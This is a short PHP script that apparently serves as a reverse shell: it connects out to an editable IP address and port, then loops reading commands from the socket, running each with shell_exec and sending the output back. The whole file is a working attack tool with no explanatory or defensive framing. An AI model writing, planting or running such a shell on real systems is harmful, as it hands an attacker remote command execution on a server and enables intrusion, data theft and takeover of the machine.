<?php
$ip = '127.0.0.1';  // EDITABLE
$port = 4343;       // EDITABLE 

$sock = fsockopen($ip, $port);
if (!$sock) exit(1);

while (1) {
    while ($cmd = fread($sock, 2048)) {
        $output = shell_exec(trim($cmd));
        fwrite($sock, $output);
    }
    sleep(1);
}
?>
